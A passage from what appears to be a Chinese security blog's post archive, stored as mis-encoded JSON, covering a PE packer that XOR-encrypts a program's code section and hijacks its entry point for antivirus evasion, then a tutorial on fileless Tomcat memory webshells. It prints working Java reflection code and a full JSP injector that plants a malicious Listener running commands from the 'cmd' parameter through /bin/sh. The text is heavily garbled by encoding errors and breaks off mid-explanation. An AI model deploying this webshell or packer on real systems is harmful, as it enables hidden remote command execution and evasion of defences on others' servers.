&#x3D; CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); &#x2F;&#x2F;è·å¾—æ–‡ä»¶å¤§å° DWORD FileSize &#x3D; GetFileSize(hFile, NULL); &#x2F;&#x2F;è¿”å›æ–‡ä»¶å¤§å°åˆ°å˜é‡nFileSize if(nFileSize) *nFileSize &#x3D; FileSize; &#x2F;&#x2F;ç”³è¯·ä¸€ç‰‡å¤§å°ä¸ºFileSizeçš„å†…å­˜å¹¶å°†æŒ‡é’ˆç½®äºé¦–ä½ char* pFileBuf &#x3D; new CHAR[FileSize]&#123; 0 &#125;; &#x2F;&#x2F;ç»™åˆšåˆšç”³è¯·çš„å†…å­˜è¯»å…¥æ•°æ® DWORD dwRead; ReadFile(hFile, pFileBuf, FileSize, &amp;dwRead, NULL); CloseHandle(hFile); return pFileBuf;&#125; åŠ è½½STUBvoid LoadStub(_In_ StubInfo* pstub) &#123; pstub-&gt;dllbase &#x3D; (char*)LoadLibraryEx(L&quot;F:\\\\stubdll.dll&quot;, NULL, DONT_RESOLVE_DLL_REFERENCES); pstub-&gt;pfnStart &#x3D; (DWORD)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;Start&quot;); &#x2F;&#x2F;è·å¾—stubçš„å…¥å£å‡½æ•°Start(è‡ªå·±å®šä¹‰åœ¨stubä¸­çš„ä¸€ä¸ªå‡½æ•° pstub-&gt;pStubConf &#x3D; (StubConf*)GetProcAddress((HMODULE)pstub-&gt;dllbase, &quot;g_conf&quot;);&#125;&#x2F;&#x2F;ä¸ä»…åŠ è½½äº†stubï¼Œè¿˜è·å¾—äº†stubæŠ›å‡ºçš„ç”¨äºæ”¶é›†ä¿¡æ¯çš„å…¨å±€ç»“æ„ä½“ï¼ˆg_conf,æ˜¯ä¸€ä¸ªstubæŠ›å‡ºçš„ç»“æ„ä½“ï¼Œç”¨äºè·å–ä¿¡æ¯ï¼Œç»“æ„å¦‚ä¸‹ï¼‰typedef struct _StubConf&#123; DWORD srcOep; &#x2F;&#x2F;å…¥å£ç‚¹ DWORD textScnRVA; &#x2F;&#x2F;ä»£ç æ®µRVA DWORD textScnSize; &#x2F;&#x2F;ä»£ç æ®µçš„å¤§å° DWORD key; &#x2F;&#x2F;è§£å¯†å¯†é’¥&#125;StubConf; åŠ å¯†ä»£ç æ®µDWORD textRVA &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;VirtualAddress;DWORD textSize &#x3D; GetSecByName(PeHmoudle, &quot;.text&quot;)-&gt;Misc.VirtualSize;Encry(PeHmoudle,pstub);void Encry(_In_ char* hpe,_In_ StubInfo pstub) &#123; &#x2F;&#x2F;è·å–ä»£ç æ®µé¦–åœ°å€ BYTE* TargetText &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;PointerToRawData + (BYTE*)hpe; &#x2F;&#x2F;è·å–ä»£ç æ®µå¤§å° DWORD TargetTextSize &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;Misc.VirtualSize; &#x2F;&#x2F;åŠ å¯†ä»£ç æ®µ for (int i &#x3D; 0; i &lt; TargetTextSize; i++) &#123; TargetText[i] ^&#x3D; 0x15; &#125; pstub.pStubConf-&gt;textScnRVA &#x3D; GetSecByName(hpe, &quot;.text&quot;)-&gt;VirtualAddress; pstub.pStubConf-&gt;textScnSize &#x3D; TargetTextSize; pstub.pStubConf-&gt;key &#x3D; 0x15;&#125;&#x2F;&#x2F;åŠ å¯†ä»£ç æ®µï¼Œå¹¶ç»™äºˆäº†stubä¸€äº›ä¿¡æ¯ æ·»åŠ æ–°åŒºæ®µchar* AddSec(_In_ char*&amp; hpe, _In_ DWORD&amp; filesize, _In_ const char* secname, _In_ const int secsize) &#123; GetFileHeader(hpe)-&gt;NumberOfSections++; PIMAGE_SECTION_HEADER pesec &#x3D; GetLastSec(hpe); &#x2F;&#x2F;è®¾ç½®åŒºæ®µè¡¨å±æ€§ memcpy(pesec-&gt;Name, secname, 8); pesec-&gt;Misc.VirtualSize &#x3D; secsize; pesec-&gt;VirtualAddress &#x3D; (pesec - 1)-&gt;VirtualAddress + AlignMent((pesec - 1)-&gt;SizeOfRawData,GetOptHeader(hpe)-&gt;SectionAlignment); pesec-&gt;SizeOfRawData &#x3D; AlignMent(secsize, GetOptHeader(hpe)-&gt;FileAlignment); pesec-&gt;PointerToRawData &#x3D; AlignMent(filesize,GetOptHeader(hpe)-&gt;FileAlignment); pesec-&gt;Characteristics &#x3D; 0xE00000E0; &#x2F;&#x2F;è®¾ç½®OPTå¤´æ˜ åƒå¤§å° GetOptHeader(hpe)-&gt;SizeOfImage &#x3D; pesec-&gt;VirtualAddress + pesec-&gt;SizeOfRawData; &#x2F;&#x2F;æ‰©å……æ–‡ä»¶æ•°æ® int newSize &#x3D; pesec-&gt;PointerToRawData + pesec-&gt;SizeOfRawData; char* nhpe &#x3D; new char [newSize] &#123;0&#125;; &#x2F;&#x2F;å‘æ–°ç¼“å†²åŒºå½•å…¥æ•°æ® memcpy(nhpe, hpe, filesize); &#x2F;&#x2F;ç¼“å­˜åŒºæ›´æ›¿ delete hpe; filesize &#x3D; newSize; return nhpe;&#125; stubé‡å®šä½å¥½å®¶ä¼™ï¼Œè¿™ä¸ªä¸œè¥¿ç¨æœ‰ä¸æ…å°±ä¼šè®©æ•´ä¸ªç¨‹åºæ‹‰è·¨æ‰ï¼ˆè¿‡æ¥äººçš„å¿ å‘Šä¸ºä»€ä¹ˆéœ€è¦stubé‡å®šä½å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çš„stubæœ€å¼€å§‹æ˜¯åŠ è½½åœ¨å†…å­˜ä¸­çš„ï¼Œå®ƒçš„è®¸å¤šæŒ‡ä»¤å¦‚è·³è½¬åˆ°çš„åœ°å€æ˜¯æŒ‰å†…å­˜ä¸ºåŸºå‡†ç¡®å®šçš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æŠŠä»–ç§»æ¤è¿›æ–‡ä»¶ï¼Œæ‰€ä»¥å®ƒçš„ä»£ç é‡Œè®¸å¤šåœ°å€å°±æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™äº›åœ°å€è¿›è¡Œå¤„ç†ï¼Œå³é‡å®šä½ï¼Œä½¿å…¶ä»¥å®¿ä¸»ç¨‹åºä¸ºæ ‡å‡†è¿›è¡Œåœ°å€ä¿®å¤ã€‚å¯èƒ½æˆ‘è¡¨è¿°çš„ä¸æ˜¯å¾ˆæ¸…æ¥šğŸ˜¥ä¸¾ä¸ªä¾‹å­å§ï¼Œæ¯”å¦‚stubåœ¨åŠ è½½è¿›å†…å­˜æ—¶ï¼Œæœ‰ä¸€æ¡è·³è½¬æŒ‡ä»¤æ—¶jmp 12345678, å¦‚æœæˆ‘ä»¬ä¸å¤„ç†å°±æŠŠè¿™æ¡æŒ‡ä»¤ç§»æ¤è¿›PEæ–‡ä»¶ï¼Œé‚£ä¹ˆPEæ–‡ä»¶æ‰§è¡Œåˆ°æ­¤å¤„æ—¶å°±ä¼šè·³è½¬åˆ°12345678ï¼Œæ­¤æ—¶çš„12345678åœ°å€å¯èƒ½å°±å·²ç»ä¸æ˜¯PEæ–‡ä»¶åŠ è½½çš„å†…å­˜åŒºé—´äº†ï¼Œä»è€Œç¨‹åºä¼šå´©æºƒã€‚æ‰€ä»¥è¦ä¿®å¤ã€‚æ ¹æ®stubçš„é‡å®šä½è¡¨è¿›è¡Œä¿®å¤ã€‚é‡å®šä½è¡¨å°±æ˜¯è®°å½•å“ªäº›åœ°å€çš„æ•°æ®éœ€è¦è¢«ä¿®å¤çš„ï¼Œæˆ‘ä»¬éå†è¿™äº›åœ°å€è¿›è¡Œä¿®å¤å³å¯ã€‚å¦‚æœä»¥ä¸‹ä»£ç çœ‹èµ·æ¥åƒåŠ›ï¼Œå¯ä»¥å…ˆå»äº†è§£ä¸€ä¸‹é‡å®šä½è¡¨ void FixStub(DWORD targetDllbase, DWORD stubDllbase,DWORD targetNewScnRva,DWORD stubTextRva )&#123; &#x2F;&#x2F;æ‰¾åˆ°stub.dllçš„é‡å®šä½è¡¨ DWORD dwRelRva &#x3D; GetOptHeader((char*)stubDllbase)-&gt;DataDirectory[5].VirtualAddress; IMAGE_BASE_RELOCATION* pRel &#x3D; (IMAGE_BASE_RELOCATION*)(dwRelRva + stubDllbase); &#x2F;&#x2F;éå†é‡å®šä½è¡¨ while (pRel-&gt;SizeOfBlock) &#123; struct TypeOffset &#123; WORD offset : 12; WORD type : 4; &#125;; TypeOffset* pTypeOffset &#x3D; (TypeOffset*)(pRel + 1); DWORD dwCount &#x3D; (pRel-&gt;SizeOfBlock - 8) &#x2F; 2; &#x2F;&#x2F;éœ€è¦é‡å®šä½çš„æ•°é‡ for (int i &#x3D; 0; i &lt; dwCount; i++) &#123; if (pTypeOffset[i].type !&#x3D; 3) &#123; continue; &#125; &#x2F;&#x2F;éœ€è¦é‡å®šä½çš„åœ°å€ DWORD* pFixAddr &#x3D; (DWORD*)(pRel-&gt;VirtualAddress + pTypeOffset[i].offset + stubDllbase); DWORD dwOld; &#x2F;&#x2F;ä¿®æ”¹å±æ€§ä¸ºå¯å†™ VirtualProtect(pFixAddr, 4, PAGE_READWRITE, &amp;dwOld); &#x2F;&#x2F;å»æ‰dllå½“å‰åŠ è½½åŸºå€ *pFixAddr -&#x3D; stubDllbase; &#x2F;&#x2F;å»æ‰é»˜è®¤çš„æ®µé¦–RVA *pFixAddr -&#x3D; stubTextRva; &#x2F;&#x2F;æ¢ä¸Šç›®æ ‡æ–‡ä»¶çš„åŠ è½½åŸºå€ *pFixAddr +&#x3D; targetDllbase; &#x2F;&#x2F;åŠ ä¸Šæ–°åŒºæ®µçš„æ®µé¦–RVA *pFixAddr +&#x3D; targetNewScnRva; &#x2F;&#x2F;æŠŠå±æ€§ä¿®æ”¹å›å» VirtualProtect(pFixAddr, 4, dwOld, &amp;dwOld); &#125; &#x2F;&#x2F;åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªé‡å®šä½å— pRel &#x3D; (IMAGE_BASE_RELOCATION*)((DWORD)pRel + pRel-&gt;SizeOfBlock); &#125; stubç§»æ¤è¿™ä¸ªç®€å•ï¼Œæ²¡å•¥è¯´çš„ memcpy(GetLastSec(PeNewHmoudle)-&gt;PointerToRawData+ PeNewHmoudle, GetSecByName(pstub.dllbase, &quot;.text&quot;)-&gt;VirtualAddress+pstub.dllbase, GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;Misc.VirtualSize); å…¥å£ç‚¹ä¿®æ”¹GetOptHeader(PeNewHmoudle)-&gt;AddressOfEntryPoint &#x3D; pstub.pfnStart-(DWORD)pstub.dllbase-GetSecByName(pstub.dllbase,&quot;.text&quot;)-&gt;VirtualAddress+GetLastSec(PeNewHmoudle)-&gt;VirtualAddress; å»éšæœºåŸºå€ä¸å»æ‰éšæœºåŸºå€ï¼ŒåŠ è½½åŸºå€å°±æ˜¯ä¸å›ºå®šçš„ï¼Œä¸æ–¹ä¾¿æ“ä½œ GetOptHeader(PeNewHmoudle)-&gt;DllCharacteristics &amp;&#x3D; (~0x40); ä¿å­˜æ–‡ä»¶void SaveFile(_In_ const char* path, _In_ const char* data, _In_ int FileSize) &#123; HANDLE hFile &#x3D; CreateFileA( path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ); DWORD Buf &#x3D; 0; WriteFile(hFile, data, FileSize, &amp;Buf,NULL); CloseHandle(hFile);&#125; åè®°ç¬¬ä¸€æ¬¡æåº•å±‚çš„ç©æ„å„¿ï¼Œå¯¼è‡´è°ƒè¯•è¿™ä¸œè¥¿èŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚ã€‚ä¸è¿‡å­¦çš„è¿˜æ˜¯ï¼Ÿè›®å¤šçš„ï¼ŸåŠ¨æ€è°ƒè¯•ï¼Œc++ï¼Œæ±‡ç¼–ï¼ŒPEç»“æ„ï¼ŒåŠ¨æ€å¯»å€éƒ½å­¦åˆ°äº†äº›ã€‚ï¼ˆæ€ä¹ˆæ„Ÿè§‰åœ¨å¾€é€†å‘èµ°äº†2333ç»§ç»­å¼„å§ï¼Œè¿™ä¸ªé¡¹ç›®ç›®å‰è¿˜æœ‰bugï¼Œç­‰ä»¥åæ¥äº†å…´è¶£å†ç»§ç»­æ·»åŠ æ›´å¤šæ›´ç‰›é€¼çš„æœºåˆ¶ã€‚","categories":[],"tags":[{"name":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","slug":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","permalink":"http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"}]},{"title":"tomcat Listenerï¼ŒFilterå†…å­˜é©¬ç®€è¦åˆ†æ","slug":"tomcat Listenerï¼ŒFilterå†…å­˜é©¬ç®€è¦åˆ†æ","date":"2021-06-28T13:51:11.051Z","updated":"2021-06-27T04:44:52.997Z","comments":true,"path":"2021/06/28/tomcat Listenerï¼ŒFilterå†…å­˜é©¬ç®€è¦åˆ†æ/","link":"","permalink":"http://const27.com/2021/06/28/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/","excerpt":"","text":"tomcatå†…å­˜é©¬tomcat å®¹å™¨tomcat ä¸»è¦åŒ…å«å››ç§å®¹å™¨ï¼šEngineï¼ŒHostï¼ŒContextï¼ŒWrapperã€‚å…¶å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾ è¯¦ç»†è§£è¯»ä¸€ä¸‹è¿™ä¸ªå›¾ã€‚ ä¸€å°æœåŠ¡å™¨ä¸Šæ˜¯å¯ä»¥é…ç½®å¤šä¸ªç«™ç‚¹çš„ï¼Œå¯¹äºtomcatæ¥è¯´ï¼Œæ¯ä¸€ä¸ªç«™ç‚¹å°±å¯¹åº”ä¸€ä¸ªHOSTã€‚ ä¸€ä¸ªç«™ç‚¹ä¸Šæ˜¯å¯ä»¥é…ç½®å¤šä¸ªWEBåº”ç”¨çš„ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªç«™ç‚¹å¯èƒ½ä¼šæœ‰OAï¼ŒSSOï¼Œé‚®ä»¶åº”ç”¨ç­‰ç­‰WEBåº”ç”¨ï¼Œå¯¹äºtomcatæ¥è¯´æ¯ä¸€ä¸ªWEBåº”ç”¨ä¾¿å¯¹åº”ç€ä¸€ä¸ªContextã€‚ ä¸€ä¸ªWEBåº”ç”¨ä¸­è‚¯å®šä¹Ÿæœ‰å¤šä¸ªè®¿é—®è·¯å¾„ï¼Œæ¯”å¦‚è¯´OAå¯èƒ½å°±æœ‰ç™»å½•ï¼Œå‰ç«¯å±•ç¤ºï¼Œæœç´¢ç­‰ã€‚æ‰€ä»¥å¯¹äºæ¯ä¸€ä¸ªè®¿é—®è·¯å¾„tomcatéƒ½ä¼šåˆ†é…ä¸€ä¸ªWrapperï¼Œæ¯ä¸€ä¸ªWrapperå¯¹åº”ä¸€ä¸ªServletï¼Œç”¨äºå¤„ç†ç‰¹å®šè¯·æ±‚ã€‚ Listener å†…å­˜é©¬tomcatæ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå¤„ç†é¡ºåºæ˜¯ Listener-&gt;Filter-&gt;Servletã€‚ä¹Ÿå°±æ˜¯è¯´Listeneræ˜¯æœ€å…ˆæ¥è§¦åˆ°æ•°æ®è¯·æ±‚çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Listenerä¸Šåšæ‰‹è„šä»è€Œè¾¾åˆ°å†…å­˜é©¬çš„ç›®çš„ã€‚ å®é™…ä¸Šï¼Œæˆ‘ä»¬æƒ³å®ç°ä¸€ä¸ªå†…å­˜é©¬ï¼Œæ€è·¯ä¾¿æ˜¯æƒ³è®©tomcatæ‰§è¡Œä¸€æ®µæ¶æ„ç¨‹åºï¼ŒæŠŠæ¶æ„çš„listeneræˆ–è€…filterç±»å†™å…¥tomcatå†…å­˜ä¸­ï¼Œç”±äºtomcatå¤„ç†è¯·æ±‚æ—¶ï¼Œè¯·æ±‚ä¼šè¢«listenerå’Œfilterå¤„ç†ï¼ˆä¹Ÿå°±æ˜¯è¯´ä¼šè¢«æˆ‘ä»¬çš„æ¶æ„ç±»å¤„ç†ï¼‰ï¼Œå› æ­¤è¾¾åˆ°éšè”½çš„æœ¨é©¬åŠŸèƒ½ã€‚ å…·ä½“æ€ä¹ˆä¸ªå®ç°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å¤§è‡´æƒ³è±¡ä¸€ä¸ªæ€è·¯ï¼šè·å–æœåŠ¡å™¨åˆæ­¥æƒé™åï¼Œåˆ›å»ºä¸€ä¸ªJSPå¹¶å‘å†…å†™å…¥å‘å†…å­˜æ³¨å…¥æ¶æ„Listeneræˆ–filterçš„ä»£ç ï¼Œéšåè®¿é—®JSPè§¦å‘JSPä»£ç ï¼Œæ¶æ„Listeneræˆ–filterè¢«æ³¨å…¥å†…å­˜ï¼Œéšååˆ é™¤JSPï¼Œé€šè¿‡æ¶æ„Listeneræˆ–filterå®ç°æ— æ–‡ä»¶webshellã€‚ä½†æ˜¯ç”±äºä¸€äº›åŸå› å¯¼è‡´ç›´æ¥é€šè¿‡addListeneræˆ–è€…addFilteræ¥æ·»åŠ ç›‘å¬å™¨æˆ–è¿‡æ»¤å™¨ä¼šæŠ¥é”™ï¼Œå…·ä½“è§£å†³æ–¹æ³•å°±æ˜¯ä¸‹æ–‡çš„å†…å®¹äº†ï¼š ServletContextå¦‚æœæˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªListenerï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šç”¨åˆ°ä¸€ä¸ªæ–¹æ³•ï¼šaddListenerã€‚ æˆ‘ä»¬æ¥åˆ†æä»¥ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œæƒ³åŠæ³•é€šè¿‡addListeneræ–¹æ³•æŠŠæ¶æ„Listeneræ³¨å…¥å†…å­˜ã€‚é¦–å…ˆaddListeneræ–¹æ³•æ˜¯è¿™ä¹ˆç”¨çš„ã€‚ ServletContext servletContext &#x3D; this.getServletConfig().getServletContext();servletContext.addListener(&quot;&quot;); æˆ‘ä»¬ç›´æ¥è·Ÿè¿›addListenerï¼Œä¼šå‘ç°è·Ÿè¿›åˆ°äº†ServletContextè¿™ä¸ªæ¥å£ç±»ã€‚ é‚£ä¹ˆå®ç°addListenerçš„ç±»æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ¢å¥è¯è¯´ï¼ŒservletContextè¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡æ˜¯å¦‚ä½•è¢«å®ä¾‹åŒ–çš„å‘¢ï¼Ÿ ApplicationContext é€šè¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°servletContextè¿™ä¸ªå¯¹è±¡å®é™…ä¸Šæ˜¯ä¸€ä¸ªApplicationContextFacadeå¯¹è±¡ã€‚æˆ‘ä»¬è·Ÿè¿›åˆ°ApplicationContextFacade.classä¸­ï¼ŒæŸ¥çœ‹addListeneræ–¹æ³•çš„å®ç°ã€‚ å‘ç°å®é™…ä¸Šæ˜¯è°ƒç”¨äº†ApplicationContextç±»çš„addListeneræ–¹æ³•ã€‚å†æ¬¡è·Ÿè¿›ã€‚ è¿™é‡Œè¿˜è°ƒç”¨äº†ä¸€ä¸ªaddListenerï¼Œå†æ¬¡è·Ÿè¿›ã€‚ è¿™é‡Œå€Ÿç”¨çš„åˆ«äººçš„å›¾ï¼Œå¯ä»¥å‘ç°å¦‚æœæœåŠ¡å™¨å·²å¯åŠ¨ï¼Œé‚£ä¹ˆé€šè¿‡ç›´æ¥è°ƒç”¨addListeneræ˜¯æ— æ³•æ·»åŠ ç›‘å¬å™¨çš„ã€‚ ç©¶å…¶åŸå› ï¼Œä¾¿æ˜¯æ­¤å¤„çš„contextæ˜¯StandardContextï¼Œå®ƒçš„çŠ¶æ€æ˜¯å¼€å§‹çŠ¶æ€ï¼Œæ— æ³•åœ¨ifåˆ¤æ–­ä¸­è¿”å›trueã€‚è¿™ä¹Ÿå°±æ˜¯ä¸Šæ–‡æåˆ°çš„ â€œä½†æ˜¯ç”±äºä¸€äº›åŸå› å¯¼è‡´ç›´æ¥é€šè¿‡addListeneræˆ–è€…addFilteræ¥æ·»åŠ ç›‘å¬å™¨æˆ–è¿‡æ»¤å™¨ä¼šæŠ¥é”™â€ å¦‚æœèƒ½å¤Ÿçªç ´ifåˆ¤æ–­ï¼Œæ¥åˆ°æ­¤å¤„ï¼Œé‚£ä¹ˆç›‘å¬å™¨å°±ä¼šè¢«é¡ºåˆ©çš„æ·»åŠ ä¸Š ç¼–å†™Listenerå†…å­˜é©¬æ—¢ç„¶é˜»ç¢æˆ‘ä»¬æ·»åŠ Listenerçš„åŸå› å·²ç»æ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆå°±åº”è¯¥è€ƒè™‘å¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶äº†ã€‚å¾ˆç®€å•ï¼Œé€šè¿‡åå°„å³å¯ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚ åœ¨ç¼–å†™åå°„ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦å»çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ€æ ·æ‰èƒ½é€šè¿‡åå°„â€å¤Ÿåˆ°â€StandardContextçš„addApplicationEventListeneræ–¹æ³•ã€‚ å¯ä»¥ç›´è§‚çš„çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡servletContextè·å¾—å®ƒçš„contextå±æ€§ï¼ˆApplicationContextå¯¹è±¡ï¼‰ï¼Œç„¶åé€šè¿‡ApplicationContextå¯¹è±¡çš„contextè·å¾—StandardContextå¯¹è±¡ï¼Œç„¶åè°ƒç”¨addApplicationEventListeneræ–¹æ³•ã€‚å¾ˆå¥½ã€‚ åå°„ä»£ç  ServletContext servletContext &#x3D; this.getServletConfig().getServletContext(); Field field &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(servletContext); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); standardContext.addApplicationEventListener(new MyListener(request,response)); &#x2F;&#x2F;è¿™ä¸€è¡Œæ˜¯å°†æŸä¸ªListenerç±»æ·»åŠ åˆ°ç›‘å¬å™¨ æ¶æ„Listenerpublic class MyListenr implements ServletRequestListener &#123; public ServletResponse response; public ServletRequest request; MyListenr(ServletRequest request, ServletResponse response) &#123; this.request &#x3D; request; this.response &#x3D; response; &#125; public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123; &#125; public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123; String cmder &#x3D; request.getParameter(&quot;cmd&quot;); try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmder); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦ sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); this.response.getWriter().write(result); &#125; catch (Exception e) &#123; System.out.println(&quot;error &quot;); &#125; &#125;&#125; å®éªŒä¸€ä¸‹ æˆ‘ä»¬å…ˆè®¿é—®/aè·¯ç”±ï¼Œè®©ä»£ç è¢«æ‰§è¡Œã€‚ç„¶ååˆ°ä»»æ„é¡µé¢ä¼ å…¥æ¶æ„å‚æ•° SUCCESSã€‚ ä¸ºäº†æ›´æ–¹ä¾¿çš„æ³¨å…¥å†…å­˜é©¬ï¼Œæˆ‘ä»ç½‘ä¸Šå«–äº†ä¸€ä¸ªJSPï¼ˆLinuxç‰ˆï¼‰ã€‚åªè¦æˆ‘ä»¬ä¸Šä¼ è¯¥JSPç„¶åè®¿é—®å®ƒä¸€ä¸‹ï¼Œå†…å­˜é©¬å°±è¢«æ³¨å…¥äº†ï¼Œååˆ†çš„æ–¹ä¾¿ã€‚ &lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%@ page import&#x3D;&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;&lt;%@ page import&#x3D;&quot;javax.servlet.annotation.WebServlet&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;&lt;% Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); ListenH listenH &#x3D; new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(&quot;test&quot;);%&gt;&lt;%! public class ListenH implements ServletRequestListener &#123; public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) &#123; this.request &#x3D; request; this.response &#x3D; response; &#125; public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123; &#125; public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123; String cmder &#x3D; request.getParameter(&quot;cmd&quot;); String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;; try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmd); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦ sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); this.response.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; &#125; &#125;%&gt; Filter å†…å­˜é©¬Filterå†…å­˜é©¬ä¸Listenerå†…å­˜é©¬è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œè¦å¤æ‚ä¸€ç‚¹ç‚¹ doFilteræ–¹æ³•å¦‚ä½•è¢«æ‰§è¡Œï¼Ÿé…ç½®filterå†å¼€å§‹åˆ†æFilterå†…å­˜é©¬æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆçŸ¥é“ï¼ŒFilterç±»ä¸­çš„doFilteræ–¹æ³•æ˜¯å¦‚ä½•è¢«æ‰§è¡Œçš„ã€‚ OKæˆ‘ä»¬å…ˆåˆ›å»ºå¥½ä¸€ä¸ªFilterã€‚ Filterç±»ä»£ç public class MyFilter implements ServletRequestListener &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; System.out.println(&quot;Filter!&quot;); chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125;&#125; æ¥ä¸‹æ¥åœ¨web.xmlä¸­æ·»åŠ Filterã€‚ æˆ‘ä»¬åœ¨doFilteræ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œï¼Œå¾—åˆ°è°ƒç”¨å¸§å¦‚ä¸‹ filterchainæˆ‘ä»¬ä»StandardWrapperValue#invoke å¤„å¼€å§‹åˆ†æ. filterChain.doFilter(request.getRequest(), response.getResponse()); é‚£ä¹ˆè¿™ä¸ªfilterChainæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ å†åº¦è·Ÿè¿›åˆ°createFilterChainæ–¹æ³•ï¼Œæ¥åˆ°äº†ApplicationFilterFactory.javaé‡Œã€‚ æ¯”è¾ƒå…³é”®çš„ä»£ç æ˜¯è¿™é‡Œã€‚è¿™ä¸ªæ–¹æ³•ä¼šéå†FilterMapsï¼Œæ£€æµ‹æ¯ä¸ªFilterMapé¡¹å¯¹åº”çš„é‚£ä¸ªFilterä¸è¯·æ±‚çš„è·¯ç”±ç­‰æ˜¯å¦ä¸€è‡´ã€‚è‹¥ä¸€è‡´åˆ™å°†ä»¥è¯¥filterçš„nameä¸ºå‚æ•°å»FilterConfigsé‡Œå»å¯»æ‰¾å¯¹åº”çš„FilterConfig,ç„¶åå°†è¯¥filterconfigæ”¾å…¥filterchainä¸­ã€‚ä¸ä¸€è‡´çš„åˆ™æŠ›å¼ƒã€‚ filterconfigä¸filterdefé‚£ä¹ˆfilterconfigåˆæ˜¯ä¸ªä»€ä¹ˆæ ·çš„ä¸œè¥¿å‘¢ï¼Ÿ æˆ‘ä»¬è·Ÿè¿›context.findFilterConfig,è¿™é‡Œçš„contextæ˜¯StandardContextã€‚ 